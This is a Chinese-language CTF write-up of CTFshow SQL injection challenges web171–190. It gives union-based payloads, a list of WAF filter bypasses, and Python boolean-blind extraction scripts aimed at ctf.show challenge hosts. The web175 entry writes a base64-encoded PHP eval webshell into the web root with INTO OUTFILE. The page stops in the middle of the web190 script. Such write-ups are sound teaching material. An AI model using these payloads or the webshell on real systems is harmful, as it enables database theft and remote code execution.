<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>CTFshow——web入门——sql注入 - IT学习者博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="CTFshow——web入门——sql注入" />
<meta property="og:description" content="web入门——sql注入 基础知识点判断是否注入order by 判断列数使用union select 判断回显查询数据库 web171web172web173web174web175sql注入绕过方法一、注释符号绕过二、大小写绕过三、内联注释绕过双写关键字绕过五、特殊编码绕过六、空格过滤绕过七、or and xor not 过滤绕过八、=号过滤绕过 web176web177web178web179web180web181web182web183web184web185web186web187web188web189web190web191web192web193web194web195web196web197web198web199-web200web201使用sqlmap爆库爆表爆列名爆字段 web202web203web204web205web206web207web208web209web210web211web212web213 基础知识点 判断是否注入 使用注释符–&#43;
&#43;代表的是空格
或者使用%23来做注释符#
1&#39; and 1=1%23
order by 判断列数 order by 是根据某一列进行排序
使用
1&#39; order by 3--&#43;
返回正常
1&#39; order by 4--&#43;
没有数据
说明列数是3
使用union select 判断回显 联合查询 取的列段要一致
查询数据库 -1&#39; union select 1,2,database()--&#43;
web171 本地测试，查询id为id = &#39;9999&#39; or id=&#39;3&#39;，9999不存在时会查询id=3
25&#39; or id=&#39;26
-1&#39;union select id,username,password from ctfshow_user --&#43;
web172 查询不能为flag
-1&#39; union select to_base64(username),hex(password) from ctfshow_user2 --&#43;" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://itnewbiea.github.io/posts/44a682fe39d1f600056e4a6d09c5bada/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2022-04-22T22:06:26+08:00" />
<meta property="article:modified_time" content="2022-04-22T22:06:26+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="IT学习者博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">IT学习者博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">CTFshow——web入门——sql注入</h1>
			
		</header>
		<div class="content post__content clearfix">
			
<div id="content_views" class="markdown_views prism-atom-one-dark">
                    <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
                        <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
                    </svg>
                    <p></p> 
<div class="toc"> 
 <h4>web入门——sql注入</h4> 
 <ul><li><a href="#_1" rel="nofollow">基础知识点</a></li><li><ul><li><a href="#_2" rel="nofollow">判断是否注入</a></li><li><a href="#order_by__7" rel="nofollow">order by 判断列数</a></li><li><a href="#union_select__16" rel="nofollow">使用union select 判断回显</a></li><li><a href="#_19" rel="nofollow">查询数据库</a></li></ul> 
  </li><li><a href="#web171_22" rel="nofollow">web171</a></li><li><a href="#web172_28" rel="nofollow">web172</a></li><li><a href="#web173_33" rel="nofollow">web173</a></li><li><a href="#web174_37" rel="nofollow">web174</a></li><li><a href="#web175_43" rel="nofollow">web175</a></li><li><a href="#sql_57" rel="nofollow">sql注入绕过方法</a></li><li><ul><li><a href="#_58" rel="nofollow">一、注释符号绕过</a></li><li><a href="#_60" rel="nofollow">二、大小写绕过</a></li><li><a href="#_63" rel="nofollow">三、内联注释绕过</a></li><li><a href="#_65" rel="nofollow">双写关键字绕过</a></li><li><a href="#_68" rel="nofollow">五、特殊编码绕过</a></li><li><a href="#_72" rel="nofollow">六、空格过滤绕过</a></li><li><a href="#or_and_xor_not__77" rel="nofollow">七、or and xor not 过滤绕过</a></li><li><a href="#_79" rel="nofollow">八、=号过滤绕过</a></li></ul> 
  </li><li><a href="#web176_86" rel="nofollow">web176</a></li><li><a href="#web177_92" rel="nofollow">web177</a></li><li><a href="#web178_95" rel="nofollow">web178</a></li><li><a href="#web179_103" rel="nofollow">web179</a></li><li><a href="#web180_111" rel="nofollow">web180</a></li><li><a href="#web181_116" rel="nofollow">web181</a></li><li><a href="#web182_121" rel="nofollow">web182</a></li><li><a href="#web183_124" rel="nofollow">web183</a></li><li><a href="#web184_147" rel="nofollow">web184</a></li><li><a href="#web185_178" rel="nofollow">web185</a></li><li><a href="#web186_212" rel="nofollow">web186</a></li><li><a href="#web187_243" rel="nofollow">web187</a></li><li><a href="#web188_253" rel="nofollow">web188</a></li><li><a href="#web189_257" rel="nofollow">web189</a></li><li><a href="#web190_281" rel="nofollow">web190</a></li><li><a href="#web191_319" rel="nofollow">web191</a></li><li><a href="#web192_322" rel="nofollow">web192</a></li><li><a href="#web193_353" rel="nofollow">web193</a></li><li><a href="#web194_381" rel="nofollow">web194</a></li><li><a href="#web195_409" rel="nofollow">web195</a></li><li><a href="#web196_417" rel="nofollow">web196</a></li><li><a href="#web197_420" rel="nofollow">web197</a></li><li><a href="#web198_426" rel="nofollow">web198</a></li><li><a href="#web199web200_447" rel="nofollow">web199-web200</a></li><li><a href="#web201_450" rel="nofollow">web201</a></li><li><ul><li><a href="#sqlmap_451" rel="nofollow">使用sqlmap</a></li><li><ul><li><a href="#_452" rel="nofollow">爆库</a></li><li><a href="#_456" rel="nofollow">爆表</a></li><li><a href="#_460" rel="nofollow">爆列名</a></li><li><a href="#_464" rel="nofollow">爆字段</a></li></ul> 
  </li></ul> 
  </li><li><a href="#web202_468" rel="nofollow">web202</a></li><li><a href="#web203_473" rel="nofollow">web203</a></li><li><a href="#web204_477" rel="nofollow">web204</a></li><li><a href="#web205_482" rel="nofollow">web205</a></li><li><a href="#web206_488" rel="nofollow">web206</a></li><li><a href="#web207_492" rel="nofollow">web207</a></li><li><a href="#web208_569" rel="nofollow">web208</a></li><li><a href="#web209_619" rel="nofollow">web209</a></li><li><a href="#web210_677" rel="nofollow">web210</a></li><li><a href="#web211_747" rel="nofollow">web211</a></li><li><a href="#web212_792" rel="nofollow">web212</a></li><li><a href="#web213_840" rel="nofollow">web213</a></li></ul> 
</div> 
<p></p> 
<h2><a id="_1"></a>基础知识点</h2> 
<h3><a id="_2"></a>判断是否注入</h3> 
<p>使用注释符<code>–+</code><br> <code>+</code>代表的是空格<br> 或者使用<code>%23</code>来做注释符#<br> <code>1' and 1=1%23</code></p> 
<h3><a id="order_by__7"></a>order by 判断列数</h3> 
<p><code>order by</code> 是根据某一列进行排序<br> 使用<br> <code>1' order by 3--+</code><br> 返回正常</p> 
<p><code>1' order by 4--+</code><br> 没有数据<br> 说明列数是<code>3</code></p> 
<h3><a id="union_select__16"></a>使用union select 判断回显</h3> 
<p><img src="https://images2.imgbox.com/31/fc/wUAWbhJe_o.png" alt="在这里插入图片描述"><br> 联合查询 取的列段要一致</p> 
<h3><a id="_19"></a>查询数据库</h3> 
<p><code>-1' union select 1,2,database()--+</code><br> <img src="https://images2.imgbox.com/ff/4f/uXPzhxAt_o.png" alt="在这里插入图片描述"></p> 
<h2><a id="web171_22"></a>web171</h2> 
<p><img src="https://images2.imgbox.com/cb/e0/FIsx3pFh_o.png" alt="在这里插入图片描述"><br> 本地测试，查询id为<code>id = '9999' or id='3'</code>，9999不存在时会查询id=3<br> <img src="https://images2.imgbox.com/f2/12/rCVawNnc_o.png" alt="在这里插入图片描述"><br> <code>25' or id='26</code><br> <code>-1'union select id,username,password from ctfshow_user --+</code></p> 
<h2><a id="web172_28"></a>web172</h2> 
<p><img src="https://images2.imgbox.com/13/1c/keJXPCzu_o.png" alt="在这里插入图片描述"><br> 查询不能为flag<br> <code>-1' union select to_base64(username),hex(password) from ctfshow_user2 --+</code><br> 将查询编码绕过</p> 
<h2><a id="web173_33"></a>web173</h2> 
<p><img src="https://images2.imgbox.com/d8/de/DoDzdjPF_o.png" alt="在这里插入图片描述"><br> 三列回显，检测返回值有无flag，回显替换<br> <code>-1' union select 1,2,password from ctfshow_user3 where username='flag' --+</code></p> 
<h2><a id="web174_37"></a>web174</h2> 
<p><img src="https://images2.imgbox.com/cf/9d/fnSB5sXl_o.png" alt="在这里插入图片描述"><br> 过滤了数字…<br> 可以用replace函数进行数字替换<br> <img src="https://images2.imgbox.com/28/af/zZukqqor_o.png" alt="在这里插入图片描述"><br> <code>-1' union select replace(username,'g','j'),replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(password,'1','A'),'2','B'),'3','C'),'4','D'),'5','E'),'6','F'),'7','G'),'8','H'),'9','I'),'0','J'),'g','j') from ctfshow_user4 where username='flag'--+</code></p> 
<h2><a id="web175_43"></a>web175</h2> 
<p><img src="https://images2.imgbox.com/1a/4e/9ZcKj6gx_o.png" alt="在这里插入图片描述"></p> 
<pre><code class="prism language-bash">PD9waHAgZXZhbCgkX1BPU1RbMV0pOz8+  
URL再编码
</code></pre> 
<p>利用写入一句话写入文件到根目录来进行命令执行<br> <code>-1' union select 1,from_base64('%50%44%39%77%61%48%41%67%5a%58%5a%68%62%43%67%6b%58%31%42%50%55%31%52%62%4d%56%30%70%4f%7a%38%2b') into outfile '/var/www/html/1.php</code><br> <img src="https://images2.imgbox.com/80/78/Y2afMRbu_o.png" alt="在这里插入图片描述"><br> 访问<code>http://54a0c4df-b74f-4f14-b60c-42b65df166f4.challenge.ctf.show/1.php</code><br> <img src="https://images2.imgbox.com/4f/67/WDhWR7hi_o.png" alt="在这里插入图片描述"><br> 密码我们可以看到是root<br> <img src="https://images2.imgbox.com/4d/d8/hlq6nQKj_o.png" alt="在这里插入图片描述"><br> <img src="https://images2.imgbox.com/b7/52/xqTjq5hW_o.png" alt="在这里插入图片描述"></p> 
<h2><a id="sql_57"></a>sql注入绕过方法</h2> 
<h3><a id="_58"></a>一、注释符号绕过</h3> 
<p>在sql中常用的注释符号有<code>--、#、/*xxx*/、</code></p> 
<h3><a id="_60"></a>二、大小写绕过</h3> 
<p>当web正则过滤的时候对大小写不敏感的情况下使用，一般很少会有这种漏洞<br> 比如当过滤了select的时候我们可以采用SEleCT来查询</p> 
<h3><a id="_63"></a>三、内联注释绕过</h3> 
<p>把要使用的查询语句放在/<em>。。。</em>/中，这样在一般的数据库是不会执行的，但是在mysql中内联注释中的语句会被执行</p> 
<h3><a id="_65"></a>双写关键字绕过</h3> 
<p>有的waf只会对关键词过滤一次，这时候采用双写的方式可以绕过。<br> <code>selselectect * from user;</code> 过滤select后变成 <code>select * from user;</code></p> 
<h3><a id="_68"></a>五、特殊编码绕过</h3> 
<p>HEX编码：<br> <img src="https://images2.imgbox.com/06/8a/TMIqIfdv_o.png" alt="在这里插入图片描述"><br> <img src="https://images2.imgbox.com/98/cf/XPUj3iSZ_o.png" alt="在这里插入图片描述"></p> 
<h3><a id="_72"></a>六、空格过滤绕过</h3> 
<p>/**/ ，()，`，tab，两个空格<br> <img src="https://images2.imgbox.com/a4/28/TzxmJRuP_o.png" alt="在这里插入图片描述"><br> 注意在使用()绕过的时候，括号里边不能有*号<br> <img src="https://images2.imgbox.com/b0/8a/YGVES03R_o.png" alt="在这里插入图片描述"></p> 
<h3><a id="or_and_xor_not__77"></a>七、or and xor not 过滤绕过</h3> 
<p><code>and = &amp;&amp; or = ||　　xor = | # 　　not = ！</code></p> 
<h3><a id="_79"></a>八、=号过滤绕过</h3> 
<p>=号和不加通配符的 like 是一样的。<br> <img src="https://images2.imgbox.com/e7/0f/xFPMPOon_o.png" alt="在这里插入图片描述"><br> 还可以使用 &lt; &gt;号来绕过，&lt;&gt; 在mysql中等于!= 如果在加一个! 双重否定代表肯定 就是=了<br> <img src="https://images2.imgbox.com/d6/c1/9jARoaqV_o.png" alt="在这里插入图片描述"><br> <img src="https://images2.imgbox.com/14/3d/DCCKYrN3_o.png" alt="在这里插入图片描述"><br> <img src="https://images2.imgbox.com/8e/90/FgZfljrd_o.png" alt="在这里插入图片描述"></p> 
<h2><a id="web176_86"></a>web176</h2> 
<p><img src="https://images2.imgbox.com/34/87/oAD2y7Ba_o.png" alt="在这里插入图片描述"><br> 万能密码<br> <code>-1' or 1=1 --+</code><br> 大小写绕过<br> <code>-1' uNion sElect 1,2,password from ctfshow_user --+</code></p> 
<h2><a id="web177_92"></a>web177</h2> 
<p>过滤了空格,使用/**/进行绕过<br> <code>'-1/**/union/**/select/**/1,username,password/**/from/**/ctfshow_user/**/where/**/username='flag</code></p> 
<h2><a id="web178_95"></a>web178</h2> 
<p>%0a换行符<br> 用反引号代替空格，但反引号不适配所有地方</p> 
<pre><code class="prism language-bash">-1<span class="token string">'union%0aselect'</span><span class="token number">1</span><span class="token string">',(select`password`from`ctfshow_user`where`username`='</span>flag<span class="token string">'),'</span><span class="token number">3</span>
</code></pre> 
<p>也可以用()代替<br> <code>-1'union%0aselect(1),2,(password)from(ctfshow_user)where(username)='flag</code></p> 
<h2><a id="web179_103"></a>web179</h2> 
<p>%0a不可以用了，试了一下，可以用%0c代替<br> <code>-1'union%0cselect(1),2,(password)from(ctfshow_user)where(username)='flag</code></p> 
<pre><code class="prism language-bash">-1<span class="token string">'union%0cselect'</span><span class="token number">1</span><span class="token string">',(select`password`from`ctfshow_user`where`username`='</span>flag<span class="token string">'),'</span><span class="token number">3</span>
</code></pre> 
<p>万能密码也可以<br> <code>-1'or'1'='1'%23</code></p> 
<h2><a id="web180_111"></a>web180</h2> 
<p>同上题。也不知道过滤了什么</p> 
<pre><code class="prism language-bash">-1<span class="token string">'union%0cselect'</span><span class="token number">1</span><span class="token string">',(select`password`from`ctfshow_user`where`username`='</span>flag<span class="token string">'),'</span><span class="token number">3</span>
</code></pre> 
<h2><a id="web181_116"></a>web181</h2> 
<p><img src="https://images2.imgbox.com/26/78/J8bIO4ye_o.png" alt="在这里插入图片描述"><br> 可以看到不让查询，也不让写文件,而且把代替空格的过滤了一堆。。。。<br> 过滤了%0c,但可以用…我也很疑惑<br> <code>-1'%0cor%0cusername='flag</code></p> 
<h2><a id="web182_121"></a>web182</h2> 
<p>过滤了flag，模糊查询<br> <code>-1'%0cor%0cusername%0clike'fla%</code></p> 
<h2><a id="web183_124"></a>web183</h2> 
<p>post传参<code>tableName=ctfshow_user</code>有回显<br> 脚本跑一下</p> 
<pre><code class="prism language-python"><span class="token keyword">import</span> requests

url <span class="token operator">=</span> <span class="token string">"http://24ee2b2d-5d5f-4e3f-a94f-adaece90cae4.challenge.ctf.show/select-waf.php"</span>

flagstr <span class="token operator">=</span> <span class="token string">"ctfshow{abdegijklmnpqruvxyz-0123456789}"</span>
flag <span class="token operator">=</span> <span class="token string">""</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> x <span class="token keyword">in</span> flagstr<span class="token punctuation">:</span>
        data <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span>
            <span class="token string">"tableName"</span><span class="token punctuation">:</span><span class="token string">"`ctfshow_user`where`pass`like'ctfshow{}%'"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>flag <span class="token operator">+</span> x<span class="token punctuation">)</span>
            <span class="token comment">#"tableName": "`ctfshow_user`where`pass`regexp('ctfshow{}')".format(flag + x)</span>
        <span class="token punctuation">}</span>
        response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>

        <span class="token keyword">if</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"$user_count = 1;"</span><span class="token punctuation">)</span><span class="token operator">&gt;</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            flag <span class="token operator">+=</span> x
            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
            <span class="token keyword">break</span>
</code></pre> 
<h2><a id="web184_147"></a>web184</h2> 
<p>where被禁用了。。。用group by代替<br> 双引号单引号也被过滤了，改为十六进制进行绕过<br> <img src="https://images2.imgbox.com/a4/82/dZ7izZsX_o.png" alt="在这里插入图片描述"><br> 取对应的ASCII码值</p> 
<pre><code class="prism language-python"><span class="token keyword">import</span> requests

url <span class="token operator">=</span> <span class="token string">"http://d504fb13-c0e9-41a3-87e1-5a4da950294c.challenge.ctf.show/select-waf.php"</span>

flagstr <span class="token operator">=</span> <span class="token string">"{abcdefghijklmnopqrstuvwxyz-0123456789}"</span>
<span class="token keyword">def</span> <span class="token function">to_hex</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    a <span class="token operator">=</span> <span class="token string">""</span>
    <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">:</span>
        a <span class="token operator">+=</span> <span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"0x"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> a
flag <span class="token operator">=</span> <span class="token string">""</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> x <span class="token keyword">in</span> flagstr<span class="token punctuation">:</span>
        data <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span>
            <span class="token string">"tableName"</span><span class="token punctuation">:</span> <span class="token string">" ctfshow_user group by pass having pass regexp(0x{})"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>to_hex<span class="token punctuation">(</span>flag <span class="token operator">+</span> x<span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token punctuation">}</span>
        response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"$user_count = 1;"</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"{} √"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span>
            flag <span class="token operator">+=</span> x
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"{} ×"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
</code></pre> 
<h2><a id="web185_178"></a>web185</h2> 
<p>过滤了数字<br> <img src="https://images2.imgbox.com/23/ed/vPaJxAOJ_o.png" alt="在这里插入图片描述"><br> 可以用这个函数进行拼接形成字符串，以而拼接成十六进制字符串，本地测试<br> <img src="https://images2.imgbox.com/1a/94/fg2Soa6S_o.png" alt="在这里插入图片描述"></p> 
<pre><code class="prism language-python"><span class="token keyword">import</span> requests

<span class="token keyword">def</span> <span class="token function">reNum</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>
    a <span class="token operator">=</span> <span class="token string">"true"</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        a <span class="token operator">+=</span> <span class="token string">"+true"</span>
    <span class="token keyword">return</span> a<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token punctuation">]</span>

<span class="token keyword">def</span> <span class="token function">reNum_to_Str</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">""</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> m<span class="token punctuation">:</span>
        <span class="token builtin">str</span> <span class="token operator">+=</span> <span class="token string">",chr("</span><span class="token operator">+</span>reNum<span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">")"</span>
    <span class="token keyword">return</span> <span class="token builtin">str</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span>

url <span class="token operator">=</span> <span class="token string">"http://60a8d24d-3e1c-42b4-ab0f-1144542c4f6c.challenge.ctf.show/select-waf.php"</span>

flagstr <span class="token operator">=</span> <span class="token string">"{abcdefghijklmnopqrstuvwxyz-0123456789}"</span>
flag <span class="token operator">=</span> <span class="token string">"ctfshow{"</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> x <span class="token keyword">in</span> flagstr<span class="token punctuation">:</span>
        data <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span>
            <span class="token string">"tableName"</span><span class="token punctuation">:</span><span class="token string">"ctfshow_user group by pass having pass like(concat({}))"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>reNum_to_Str<span class="token punctuation">(</span>flag <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">"%"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token punctuation">}</span>
        response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span>text
        <span class="token keyword">if</span> <span class="token string">"$user_count = 0;"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> response<span class="token punctuation">:</span>
            flag <span class="token operator">+=</span> x
            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
</code></pre> 
<h2><a id="web186_212"></a>web186</h2> 
<p>同上</p> 
<pre><code class="prism language-python"><span class="token keyword">import</span> requests

<span class="token keyword">def</span> <span class="token function">reNum</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>
    a <span class="token operator">=</span> <span class="token string">"true"</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        a <span class="token operator">+=</span> <span class="token string">"+true"</span>
    <span class="token keyword">return</span> a<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token punctuation">]</span>

<span class="token keyword">def</span> <span class="token function">reNum_to_Str</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">""</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> m<span class="token punctuation">:</span>
        <span class="token builtin">str</span> <span class="token operator">+=</span> <span class="token string">",chr("</span><span class="token operator">+</span>reNum<span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">")"</span>
    <span class="token keyword">return</span> <span class="token builtin">str</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span>

url <span class="token operator">=</span> <span class="token string">"http://a41376d2-be93-479e-88ae-b7340c046188.challenge.ctf.show/select-waf.php"</span>

flagstr <span class="token operator">=</span> <span class="token string">"{abcdefghijklmnopqrstuvwxyz-0123456789}"</span>
flag <span class="token operator">=</span> <span class="token string">"ctfshow{"</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> x <span class="token keyword">in</span> flagstr<span class="token punctuation">:</span>
        data <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span>
            <span class="token string">"tableName"</span><span class="token punctuation">:</span><span class="token string">"ctfshow_user group by pass having pass regexp(concat({}))"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>reNum_to_Str<span class="token punctuation">(</span>flag <span class="token operator">+</span> x<span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token punctuation">}</span>
        response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span>text
        <span class="token keyword">if</span> <span class="token string">"$user_count = 0;"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> response<span class="token punctuation">:</span>
            flag <span class="token operator">+=</span> x
            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
</code></pre> 
<h2><a id="web187_243"></a>web187</h2> 
<p><img src="https://images2.imgbox.com/7d/87/yYJPWu7J_o.png" alt="在这里插入图片描述"><br> <img src="https://images2.imgbox.com/4e/ab/gKZZRB3b_o.png" alt="在这里插入图片描述"><br> <img src="https://images2.imgbox.com/40/93/OVKQWzxC_o.png" alt="在这里插入图片描述"><br> 拼接他的SQL语句可以看到成功执行<br> <img src="https://images2.imgbox.com/ad/53/Eqdyir7j_o.png" alt="在这里插入图片描述"><br> 查询<code>or</code>后面第一位为非零数字就会返回true<br> <code>用户名：admin 密码：ffifdyop</code><br> <a href="https://blog.csdn.net/solitudi/article/details/107813286?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522160631731619195283021913%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=160631731619195283021913&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_v2~rank_blog_default-1-107813286.pc_v2_rank_blog_default&amp;utm_term=md5%20%20_POST%20%20password%20%20,true&amp;spm=1018.2118.3001.4450">[SQL绕过]md5($str,true)类型绕过</a><br> <img src="https://images2.imgbox.com/74/1e/9bR7T7yQ_o.png" alt="在这里插入图片描述"></p> 
<h2><a id="web188_253"></a>web188</h2> 
<p><code>用户名: 0 密码：0</code><br> <img src="https://images2.imgbox.com/dd/83/Q0jjv78P_o.png" alt="在这里插入图片描述"><br> 当查询没有用单引号表示时，会默认为数字，数字和字符串进行比较时，会将字符串转化为0，从而用户名为字符串的数据都会被查询出来。</p> 
<h2><a id="web189_257"></a>web189</h2> 
<p>用户为0返回 密码错误:<code>\u5bc6\u7801\u9519\u8bef</code><br> 用户为1返回 查询失败:<code>\u67e5\u8be2\u5931\u8d25</code><br> 利用0和1返回不同数据进行布尔盲注</p> 
<pre><code class="prism language-python"><span class="token keyword">import</span> requests

url <span class="token operator">=</span> <span class="token string">"http://b4aa795b-a307-48a0-b671-3ed16d689ece.challenge.ctf.show/api/index.php"</span>

flagstr <span class="token operator">=</span> <span class="token string">"ctfshow{abdegijklmnpqruvxyz-0123456789}"</span>
flag <span class="token operator">=</span> <span class="token string">"ctfshow{"</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> x <span class="token keyword">in</span> flagstr<span class="token punctuation">:</span>
        payload <span class="token operator">=</span> <span class="token string">"if((load_file('/var/www/html/api/index.php'))regexp('{}'),0,1)"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>flag <span class="token operator">+</span> x<span class="token punctuation">)</span>
        data <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span>
            <span class="token string">"username"</span><span class="token punctuation">:</span>payload<span class="token punctuation">,</span>
            <span class="token string">"password"</span><span class="token punctuation">:</span><span class="token number">1</span>
        <span class="token punctuation">}</span>
        response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>

        <span class="token keyword">if</span> <span class="token string">"\\u5bc6\\u7801\\u9519\\u8bef"</span> <span class="token keyword">in</span> response<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
            flag <span class="token operator">+=</span> x
            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
</code></pre> 
<h2><a id="web190_281"></a>web190</h2> 
<p><code>1'or 1=1# 密码错误</code><br> <code>1′or 1=2# 用户名不存在</code></p> 
<pre><code class="prism language-python"><span class="token operator">//</span>大佬脚本
<span class="token keyword">import</span> requests
